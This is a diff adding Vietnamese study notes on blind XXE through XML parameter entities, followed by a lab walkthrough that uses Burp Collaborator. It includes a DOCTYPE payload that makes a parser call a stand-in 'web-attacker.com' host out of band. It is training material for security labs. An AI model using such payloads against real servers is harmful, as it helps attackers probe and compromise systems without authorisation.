@@ -167,3 +167,47 @@
 
 > Xong:
 > ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-3.png) ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-4.png)
+
+---
+
+> Đôi khi, cuộc `attack XXE` sử dụng các `entity` thông thường bị chặn do `input validation`.
+>
+> Trong case này, có thể dùng các `parameter entity XML` để thay thế.
+
+> ```
+> <!ENTITY % myparameterentity "my parameter entity value" >
+> ```
+
+> Các `parameter entities` được tham chiếu bằng kí tự `%` thay vì `&`:
+>
+> ```
+> %myparameterentity;
+> ```
+
+> Điều này có nghĩa là có thể kiểm tra `blind XXE` bằng cách sử dụng `out-of-band` phát hiện qua `XML parameter` như sau:
+>
+> ```
+> <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+> ```
+
+> `XXE Payload` này khai báo `XML Parameter` được gọi là `xxe` và sau đó sử dụng `entity` trong `DTD`. Điều này thực hiện tra cứu `DNS` và `HTTP request` đến `attacker domain`, xác minh rằng `attack` thành công
+
+#### Lab: Blind XXE with out-of-band interaction via XML parameter entities
+
+> Tag: Practitioner
+>
+> Des: Lab này chứa tính năng `check stock` phân tích cú pháp `XML`, nhưng không hiển thị bất kì giá trị không mong muốn và chặn các `entity` bên ngoài
+>
+> Để solve dùng `parameter entity` để tra cứu `DNS` và `HTTP request` cho `Burp Collaborator`
+
+**Giao diện**
+![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities-0.png)
+
+> Dùng Burp để chặn:
+>
+> Sửa request với `Burp Collaborator`
+>
+> ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities-1.png)
+
+> DONE:
+> ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities-2.png) ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities-3.png)
